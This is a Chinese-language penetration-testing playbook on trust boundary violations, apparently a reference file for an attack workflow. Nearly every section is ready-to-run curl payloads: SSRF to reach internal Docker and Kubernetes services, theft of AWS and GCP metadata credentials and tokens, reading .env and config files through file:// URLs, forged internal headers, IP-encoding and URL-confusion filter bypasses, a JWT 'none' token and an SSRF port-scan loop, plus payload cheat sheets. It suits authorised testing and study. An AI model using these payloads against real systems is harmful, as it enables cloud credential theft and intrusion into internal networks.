# 信任边界违规（Trust Boundary Violation）利用

## 1. 技术介绍

### 1.1 漏洞原理

信任边界违规（Trust Boundary Violation）发生在应用程序错误地信任来自不同信任级别的数据时。当数据跨越信任边界（如从外部网络到内部网络、从客户端到服务器、从用户空间到内核空间）时，应用程序未进行适当的验证或转换。

### 1.2 漏洞本质

信任边界违规的本质是**架构设计缺陷**：应用程序假设某些边界（如网络隔离、防火墙规则）足以保护资源，而忽略了应用层攻击可以绕过这些边界。

### 1.3 常见信任边界

| 边界类型 | 边界描述 | 常见违规场景 |
|---------|---------|-------------|
| 网络边界 | 外部网络 ↔ 内部网络 | SSRF 绕过网络隔离 |
| 应用边界 | 客户端 ↔ 服务器端 | 客户端输入未验证 |
| 权限边界 | 普通用户 ↔ 管理员 | 权限检查缺失 |
| 数据边界 | 可信数据 ↔ 用户数据 | 混合数据处理 |
| 服务边界 | 服务 A ↔ 服务 B | 服务间无认证 |

### 1.4 案例分析

典型的信任边界违规：

**架构设计：**
```
外部用户 → web-app (PUBLIC) → internal-service (PRIVATE)
                                    ↑
                            仅依赖网络隔离
                            无应用层认证
```

**信任边界：**
- **预期边界：** Docker 网络隔离保护 internal-service
- **实际边界：** 无应用层验证，仅网络层隔离
- **违规方式：** SSRF 绕过网络隔离

**攻击路径：**
```
1. 攻击者访问外部端点：http://localhost:34287/redirect.php?url=http://internal-service/
2. web-app 执行 file_get_contents("http://internal-service/")
3. 请求跨越网络边界到达 internal-service
4. internal-service 信任所有 Docker 网络内请求
5. 返回敏感 FLAG 数据
```

---

## 2. 攻击常见于哪些业务场景

### 2.1 常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 微服务架构 | 服务间通信 | 假设网络隔离足够，无服务间认证 |
| 云原生应用 | VPC 内网通信 | 假设 VPC 隔离安全，无应用层验证 |
| Docker/K8s | 容器间通信 | 假设网络策略足够，无 mTLS |
| API 网关 | 后端服务调用 | 假设网关认证足够，后端无验证 |
| 内部工具 | 管理后台 | 假设内网安全，无登录机制 |
| 代理/转发 | URL 转发器 | 信任用户提供的 URL |
| Webhook 服务 | 回调通知 | 信任回调地址 |
| 文件处理 | 远程文件抓取 | 信任用户提供的文件 URL |

### 2.2 微服务信任边界违规

**场景描述：**
```
用户 → API Gateway → Service A → Service B → Database
       (认证)      (信任网关)  (信任 A)   (信任 B)
```

**风险点：**
- Service B 假设所有请求都经过认证
- 如果攻击者绕过网关直接访问 Service B，无认证检查
- 服务间无 mTLS 或 API Key 验证

**利用方法：**
```bash
# 直接访问内部服务（如果网络可达）
curl http://service-b:8080/api/sensitive-data

# 或通过 SSRF 访问
curl "http://gateway/proxy?url=http://service-b:8080/api/sensitive-data"
```

### 2.3 云环境信任边界违规

**场景描述：**
```
外部用户 → Load Balancer → EC2 Instance → RDS Database
           (安全组)       (安全组)       (安全组)
```

**风险点：**
- 假设安全组足够保护资源
- 实例元数据服务无认证（169.254.169.254）
- SSRF 可访问元数据获取 IAM 凭证

**利用方法：**
```bash
# 访问 EC2 元数据
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 获取临时凭证
# 使用凭证访问 AWS 资源
```

### 2.4 Docker 环境信任边界违规

**场景描述：**
```
外部用户 → web-app (端口暴露) → internal-service (仅 Docker 网络)
```

**风险点：**
- 假设 Docker 网络隔离足够
- internal-service 无应用层认证
- SSRF 可绕过网络隔离

**利用方法：**
```bash
# 利用 SSRF 访问内部服务
curl "http://web-app:34287/redirect.php?url=http://internal-service/"

# 获取敏感信息
# 响应包含 FLAG{...}
```

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 网络边界探测

**测试内部服务可访问性：**
```bash
# 直接访问内部服务（如果网络可达）
curl http://internal-service/
curl http://10.0.0.2/
curl http://172.16.0.2/

# 通过 SSRF 探测
curl "http://web-app/proxy?url=http://internal-service/"
```

**测试服务间通信：**
```bash
# 枚举内部服务名
curl "http://web-app/proxy?url=http://api-gateway/"
curl "http://web-app/proxy?url=http://user-service/"
curl "http://web-app/proxy?url=http://database-admin/"
```

#### 3.1.2 应用层认证检测

**检测内部服务认证：**
```bash
# 直接访问内部服务
curl -I http://internal-service/
# 观察响应头
# 200 OK → 无认证
# 401 Unauthorized → 有认证
# 403 Forbidden → 有授权
```

**检测服务间认证机制：**
```bash
# 检查是否需要 API Key
curl -H "X-API-Key: test" http://internal-service/

# 检查是否需要 Bearer Token
curl -H "Authorization: Bearer test" http://internal-service/

# 检查是否需要特定 Header
curl -H "X-Internal-Request: true" http://internal-service/
```

#### 3.1.3 信任边界识别

**识别信任假设：**
```
1. 应用是否假设某些请求是"可信的"？
2. 是否有基于来源 IP 的信任？
3. 是否有基于 Header 的信任？
4. 是否有基于网络位置的信任？
```

**检测基于 IP 的信任：**
```bash
# 测试 X-Forwarded-For 头
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin

# 测试 X-Real-IP 头
curl -H "X-Real-IP: 10.0.0.1" http://target.com/internal
```

**检测基于 Header 的信任：**
```bash
# 测试内部请求头
curl -H "X-Internal-Request: true" http://target.com/api/admin

# 测试服务间头
curl -H "X-Service-Name: trusted-service" http://target.com/api/data
```

### 3.2 白盒测试

#### 3.2.1 代码审计关键词

**搜索信任假设：**
```bash
# 搜索基于 IP 的信任
grep -rn "127.0.0.1\|localhost\|10\.\|172\.16\|192\.168" *.php *.py *.java

# 搜索基于 Header 的信任
grep -rn "X-Internal\|X-Service\|X-Admin\|X- Trusted" *.php *.py *.java

# 搜索网络边界假设
grep -rn "internal\|private\|local" *.php *.py *.java
```

**检测缺失的验证：**
```bash
# PHP：搜索缺失的认证检查
grep -rn "if.*isset.*_SESSION\|if.*authenticated" *.php

# Python：搜索缺失的装饰器
grep -rn "@login_required\|@auth_required" *.py

# Java：搜索缺失的注解
grep -rn "@PreAuthorize\|@RolesAllowed" *.java
```

#### 3.2.2 架构分析

**绘制信任边界图：**
```
┌─────────────────────────────────────────────────────┐
│                  外部网络 (Untrusted)                │
│                      ↓                              │
│  ┌─────────────┐    │                               │
│  │  Firewall   │    │                               │
│  └─────────────┘    │                               │
│                      ↓                              │
│  ┌─────────────────────────────────────────────┐   │
│  │         DMZ (Partially Trusted)             │   │
│  │  ┌─────────────┐                            │   │
│  │  │  Web Server │                            │   │
│  │  └─────────────┘                            │   │
│  └─────────────────────────────────────────────┘   │
│                      ↓                              │
│  ┌─────────────────────────────────────────────┐   │
│  │         内部网络 (Trusted)                   │   │
│  │  ┌─────────────┐  ┌─────────────┐          │   │
│  │  │ App Server  │→ │ DB Server   │          │   │
│  │  └─────────────┘  └─────────────┘          │   │
│  └─────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘

信任边界违规点：
1. Web Server → App Server（无认证）
2. App Server → DB Server（弱认证）
3. 内部网络假设所有内部请求可信
```

---

## 4. 漏洞利用方法

### 4.1 SSRF 绕过网络隔离

#### 4.1.1 Docker 环境 SSRF

```bash
# 利用 web-app 作为跳板
curl "http://web-app:34287/redirect.php?url=http://internal-service/"

# 获取内部服务敏感信息
# 响应：FLAG{...}
```

#### 4.1.2 K8s 环境 SSRF

```bash
# 访问 K8s API Server
curl "http://target.com/proxy?url=http://kubernetes.default/"

# 访问 K8s 元数据
curl "http://target.com/proxy?url=http://169.254.169.254/computeMetadata/v1/"
```

### 4.2 服务间认证绕过

#### 4.2.1 直接访问内部服务

```bash
# 如果网络可达且无认证
curl http://internal-service:8080/api/admin/users
curl http://database-admin:5432/api/config
```

#### 4.2.2 伪造服务间请求头

```bash
# 伪造内部请求头
curl -H "X-Internal-Request: true" http://internal-service/api/data
curl -H "X-Service-Name: trusted-service" http://internal-service/api/data
curl -H "X-Forwarded-For: 10.0.0.1" http://internal-service/api/data
```

### 4.3 云元数据服务利用

#### 4.3.1 AWS EC2 元数据

```bash
# 获取实例元数据
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# 获取 IAM 角色凭证
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"

# 使用凭证访问 S3
aws s3 ls --access-key <access-key> --secret-key <secret-key>
```

#### 4.3.2 GCP 元数据

```bash
# 获取项目信息
curl "http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/"

# 获取服务账户令牌
curl "http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

### 4.4 敏感信息提取

#### 4.4.1 内部服务信息

```bash
# 获取内部服务配置
curl "http://web-app/proxy?url=http://internal-service/config"

# 获取数据库连接信息
curl "http://web-app/proxy?url=http://internal-service/db-config"
```

#### 4.4.2 源代码/配置文件

```bash
# 读取应用配置
curl "http://web-app/proxy?url=file:///app/.env"
curl "http://web-app/proxy?url=file:///var/www/html/config.php"
```

### 4.5 组合攻击

#### 4.5.1 SSRF + 无认证 + 敏感信息

```bash
# 1. 利用 SSRF 访问内部服务
# 2. 内部服务无认证
# 3. 获取敏感数据

curl "http://web-app:34287/redirect.php?url=http://internal-service/" | grep -o "FLAG{.*}"
```

#### 4.5.2 SSRF + 端口扫描 + 服务识别

```bash
# 扫描内部服务端口
for port in 80 443 3000 5000 8080 8443 9200; do
    curl -s --max-time 2 "http://web-app/proxy?url=http://internal-service:$port/" &
done

# 识别开放端口和服务
```

---

## 5. 漏洞利用绕过方法

### 5.1 绕过网络访问控制

#### 5.1.1 DNS 重绑定

```bash
# 使用 DNS 重绑定服务
curl "http://bindattacker.com/"

# 第一次 DNS 查询：返回外部 IP（通过检查）
# 第二次 DNS 查询：返回内部 IP（实际请求）
```

#### 5.1.2 IPv6 映射

```bash
# 利用 IPv6 映射到 IPv4
curl "http://[::ffff:127.0.0.1]/"
curl "http://[::ffff:10.0.0.1]/"
```

### 5.2 绕过 IP 检查

#### 5.2.1 IP 地址编码

```bash
# 八进制
curl "http://0177.0.0.1/"

# 十六进制
curl "http://0x7f000001/"

# 十进制
curl "http://2130706433/"
```

#### 5.2.2 URL 解析不一致

```bash
# 利用@符号
curl "http://allowed.com@127.0.0.1/"
# 某些解析器认为是 127.0.0.1，某些认为是 allowed.com

# 利用路径混淆
curl "http://127.0.0.1/@allowed.com/"
```

### 5.3 绕过 Header 检查

#### 5.3.1 Header 规范化绕过

```bash
# 大小写混合
curl -H "x-internal-request: true" http://target.com/
curl -H "X-INTERNAL-REQUEST: true" http://target.com/

# 添加空格
curl -H "X-Internal-Request:  true" http://target.com/
curl -H "X-Internal-Request : true" http://target.com/
```

#### 5.3.2 多 Header 注入

```bash
# 注入多个同名 Header
curl -H "X-Internal-Request: false" -H "X-Internal-Request: true" http://target.com/
```

### 5.4 绕过服务认证

#### 5.4.1 JWT 令牌伪造

```bash
# 如果服务间使用 JWT 但验证薄弱
# 使用 None 算法
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ." http://internal-service/
```

#### 5.4.2 API Key 猜测

```bash
# 尝试常见 API Key
curl -H "X-API-Key: admin" http://internal-service/
curl -H "X-API-Key: internal" http://internal-service/
curl -H "X-API-Key: service" http://internal-service/
```

---

## 6. 渗透测试决策流程

```
                                    ┌─────────────────┐
                                    │  信任边界违规测试 │
                                    └────────┬────────┘
                                             │
                                             ▼
                                    ┌─────────────────┐
                                    │   架构分析       │
                                    │  - 绘制信任边界  │
                                    │  - 识别服务依赖  │
                                    │  - 分析网络拓扑  │
                                    └────────┬────────┘
                                             │
                    ┌────────────────────────┼────────────────────────┐
                    │                        │                        │
                    ▼                        ▼                        ▼
          ┌─────────────────┐      ┌─────────────────┐      ┌─────────────────┐
          │  发现 SSRF 端点  │      │  发现无认证服务  │      │  发现弱认证服务  │
          └────────┬────────┘      └────────┬────────┘      └────────┬────────┘
                   │                        │                        │
                   ▼                        ▼                        ▼
          ┌─────────────────┐      ┌─────────────────┐      ┌─────────────────┐
          │  ref/ssrf-      │      │  ref/no-auth-   │      │  ref/auth-      │
          │  attack-        │      │  system-        │      │  bypass.md      │
          │  advanced.md    │      │  exploitation.md│      │                 │
          └─────────────────┘      └─────────────────┘      └─────────────────┘
```

---

## 7. 常用 Payload 速查表

### 7.1 内部服务探测

| 目标 | Payload | 说明 |
|------|---------|------|
| Docker DNS | `http://internal-service/` | Docker 内部 DNS |
| K8s DNS | `http://kubernetes.default/` | K8s 服务发现 |
| AWS 元数据 | `http://169.254.169.254/latest/meta-data/` | EC2 元数据 |
| GCP 元数据 | `http://metadata.google.internal/` | GCP 元数据 |
| Azure 元数据 | `http://169.254.169.254/metadata/instance` | Azure 元数据 |

### 7.2 信任 Header

| Header | 用途 | 示例 |
|--------|------|------|
| `X-Internal-Request` | 标记内部请求 | `X-Internal-Request: true` |
| `X-Service-Name` | 服务标识 | `X-Service-Name: trusted-service` |
| `X-Forwarded-For` | 源 IP 欺骗 | `X-Forwarded-For: 127.0.0.1` |
| `X-Real-IP` | 真实 IP | `X-Real-IP: 10.0.0.1` |
| `X-Admin` | 管理员请求 | `X-Admin: true` |

### 7.3 云元数据端点

| 云服务商 | 端点 | 说明 |
|---------|------|------|
| AWS | `169.254.169.254/latest/meta-data/` | EC2 实例元数据 |
| AWS | `169.254.169.254/latest/meta-data/iam/` | IAM 角色凭证 |
| GCP | `metadata.google.internal/computeMetadata/v1/` | GCP 元数据 |
| Azure | `169.254.169.254/metadata/instance` | Azure 实例元数据 |
| Alibaba | `100.100.100.200/latest/meta-data/` | 阿里云元数据 |

### 7.4 绕过技术

| 技术 | Payload | 说明 |
|------|---------|------|
| 八进制 IP | `http://0177.0.0.1/` | 绕过 IP 过滤 |
| 十六进制 IP | `http://0x7f000001/` | 绕过 IP 过滤 |
| IPv6 映射 | `http://[::ffff:127.0.0.1]/` | 绕过 IPv4 过滤 |
| DNS 重绑定 | `http://sslip.io/` | 绕过 DNS 检查 |
| URL@混淆 | `http://allowed.com@127.0.0.1/` | 绕过 URL 检查 |

---

## 8. 参考资源

- [OWASP Top 10:2025 A06 Insecure Design](https://owasp.org/Top10/2025/A06_2025-Insecure_Design/)
- [OWASP SSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF Testing](https://portswigger.net/web-security/ssrf)
- [AWS SSRF 防护](https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-ssrf.html)
- [微服务安全最佳实践](https://owasp.org/www-project-microservice-security/)
